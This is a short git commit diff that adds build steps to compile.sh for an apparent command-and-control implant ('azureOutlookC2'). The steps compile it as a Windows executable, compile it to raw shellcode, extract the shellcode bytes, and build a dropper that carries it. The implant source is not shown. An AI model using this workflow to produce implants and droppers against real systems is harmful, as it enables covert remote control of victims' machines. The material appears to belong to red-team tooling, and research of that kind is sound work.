63bccd79e2530f6b56796e57c42655d3b398d990
Bobby Cooke <19784872+boku7@users.noreply.github.com>
2021-09-20 17:20:07 -0700

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,1 +1,9 @@
+# Compile as EXE
 x86_64-w64-mingw32-gcc -m64 -mwindows -Os azureOutlookC2.c -o azureOutlookC2.exe -lwininet
+# Shellcode Compile for Dropper
+x86_64-w64-mingw32-gcc -m64 -mwindows -c azureOutlookC2.c -o azureOutlookC2.o -masm=intel -Wall -m64 -fno-asynchronous-unwind-tables -nostdlib -fno-ident -Wl,-Tlinker.ld,--no-seh
+# MacOS Get Shellcode
+for x in $(objdump -d azureOutlookC2.o -x86-asm-syntax=intel | grep "^ " | cut -f1 | awk -F: '{print $2}'); do echo -n "\x"$x; done; echo
+# Copy-Paste Shellcode into dropper.c
+# Compile Dropper Command
+x86_64-w64-mingw32-gcc -m64 -mwindows dropper.c -o dropper.exe -masm=intel
